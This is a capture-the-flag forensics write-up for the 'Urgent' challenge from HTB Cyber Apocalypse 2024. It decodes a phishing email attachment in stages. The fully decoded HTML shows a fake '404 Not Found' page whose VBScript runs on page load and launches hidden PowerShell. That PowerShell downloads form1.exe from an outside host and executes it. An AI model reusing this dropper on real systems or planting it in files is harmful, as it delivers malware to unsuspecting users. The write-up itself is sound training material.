---
title: "Urgent"
description: "In the midst of Cybercity's \"Fray,\" a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions' destiny."
pubDate: 2024-03-14
ctf: "HTB Cyber Apocalypse 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-htbctf/icon.jpg"
---

We start with an EML file, inside a base64 encoded file  `onlineform.html`.

```
-----------------------2de0b0287d83378ead36e06aee64e4e5
Content-Type: text/html; filename="onlineform.html"; name="onlineform.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="onlineform.html"; name="onlineform.html"

PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT48L3RpdGxlPg0KPGJvZHk+DQo8c2NyaXB0IGxhbmd1YWdl
PSJKYXZhU2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KZG9jdW1lbnQud3JpdGUodW5l
c2NhcGUoJyUzYyU2OCU3NCU2ZCU2YyUzZSUwZCUwYSUzYyU2OCU2NSU2MSU2NCUzZSUwZCUwYSUz
YyU3NCU2OSU3NCU2YyU2NSUzZSUyMCUzZSU1ZiUyMCUzYyUyZiU3NCU2OSU3NCU2YyU2NSUzZSUw
ZCUwYSUzYyU2MyU2NSU2ZSU3NCU2NSU3MiUzZSUzYyU2OCUzMSUzZSUzNCUzMCUzNCUyMCU0ZSU2
ZiU3NCUyMCU0NiU2ZiU3NSU2ZSU2NCUzYyUyZiU2OCUzMSUzZSUzYyUyZiU2MyU2NSU2ZSU3NCU2
NSU3MiUzZSUwZCUwYSUzYyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU2YyU2MSU2ZSU2NyU3NSU2MSU2
NyU2NSUzZCUyMiU1NiU0MiU1MyU2MyU3MiU2OSU3MCU3NCUyMiUzZSUwZCUwYSU1MyU3NSU2MiUy
...
```

If we base64 decode the attachment, we get a HTML file containing this:

```html
<html>
<head>
<title></title>
<body>
<script language="JavaScript" type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0d%0a%3c%68%65%61%64%3e%0d%0a%3c%74%69%74%6c%65%3e%20%3e%5f%20%3c%2f%74%69%74%6c%65%3e%0d%0a%3c%63%65%6e%74%65%72%3e%3c%68%31%3e%34%30%34%20%4e%6f%74%20%46%6f%75%6e%64%3c%2f%68%31%3e%3c%2f%63%65%6e%74%65%72%3e%0d%0a%3c%73%63%72%69%70%74%20%6c%61%6e%67%75%61%67%65%3d%22%56%42%53%63%72%69%70%74%22%3e%0d%0a%53%75%62%20%77%69%6e%64%6f%77%5f%6f%6e%6c%6f%61%64%0d%0a%09%63%6f%6e%73%74%20%69%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%20%3d%20%33%0d%0a%09%43%6f%6e%73%74%20%48%49%44%44%45%4e%5f%57%49%4e%44%4f%57%20%3d%20%31%32%0d%0a%09%53%65%74%20%4c%6f%63%61%74%6f%72%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%57%62%65%6d%53%63%72%69%70%74%69%6e%67%2e%53%57%62%65%6d%4c%6f%63%61%74%6f%72%22%29%0d%0a%09%53%65%74%20%53%65%72%76%69%63%65%20%3d%20%4c%6f%63%61%74%6f%72%2e%43%6f%6e%6e%65%63%74%53%65%72%76%65%72%28%29%0d%0a%09%53%65%72%76%69%63%65%2e%53%65%63%75%72%69%74%79%5f%2e%49%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%4c%65%76%65%6c%3d%69%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%0d%0a%09%53%65%74%20%6f%62%6a%53%74%61%72%74%75%70%20%3d%20%53%65%72%76%69%63%65%2e%47%65%74%28%22%57%69%6e%33%32%5f%50%72%6f%63%65%73%73%53%74%61%72%74%75%70%22%29%0d%0a%09%53%65%74%20%6f%62%6a%43%6f%6e%66%69%67%20%3d%20%6f%62%6a%53%74%61%72%74%75%70%2e%53%70%61%77%6e%49%6e%73%74%61%6e%63%65%5f%0d%0a%09%53%65%74%20%50%72%6f%63%65%73%73%20%3d%20%53%65%72%76%69%63%65%2e%47%65%74%28%22%57%69%6e%33%32%5f%50%72%6f%63%65%73%73%22%29%0d%0a%09%45%72%72%6f%72%20%3d%20%50%72%6f%63%65%73%73%2e%43%72%65%61%74%65%28%22%63%6d%64%2e%65%78%65%20%2f%63%20%70%6f%77%65%72%73%68%65%6c%6c%2e%65%78%65%20%2d%77%69%6e%64%6f%77%73%74%79%6c%65%20%68%69%64%64%65%6e%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%44%6f%77%6e%6c%6f%61%64%46%69%6c%65%28%27%68%74%74%70%73%3a%2f%2f%73%74%61%6e%64%75%6e%69%74%65%64%2e%68%74%62%2f%6f%6e%6c%69%6e%65%2f%66%6f%72%6d%73%2f%66%6f%72%6d%31%2e%65%78%65%27%2c%27%25%61%70%70%64%61%74%61%25%5c%66%6f%72%6d%31%2e%65%78%65%27%29%3b%53%74%61%72%74%2d%50%72%6f%63%65%73%73%20%27%25%61%70%70%64%61%74%61%25%5c%66%6f%72%6d%31%2e%65%78%65%27%3b%24%66%6c%61%67%3d%27%48%54%42%7b%34%6e%30%74%68%33%72%5f%64%34%79%5f%34%6e%30%74%68%33%72%5f%70%68%31%73%68%69%31%6e%67%5f%34%74%74%33%6d%70%54%7d%22%2c%20%6e%75%6c%6c%2c%20%6f%62%6a%43%6f%6e%66%69%67%2c%20%69%6e%74%50%72%6f%63%65%73%73%49%44%29%0d%0a%09%77%69%6e%64%6f%77%2e%63%6c%6f%73%65%28%29%0d%0a%65%6e%64%20%73%75%62%0d%0a%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%68%65%61%64%3e%0d%0a%3c%2f%68%74%6d%6c%3e%0d%0a'));
</script>
</body>
</html>
```

That's a suspicious script tag... Decoding the URL encoding there is some more HTML, containing the flag:

```html
<html>
<head>
<title> >_ </title>
<center><h1>404 Not Found</h1></center>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://standunited.htb/online/forms/form1.exe','%appdata%\form1.exe');Start-Process '%appdata%\form1.exe';$flag='HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>

```

Flag: `HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`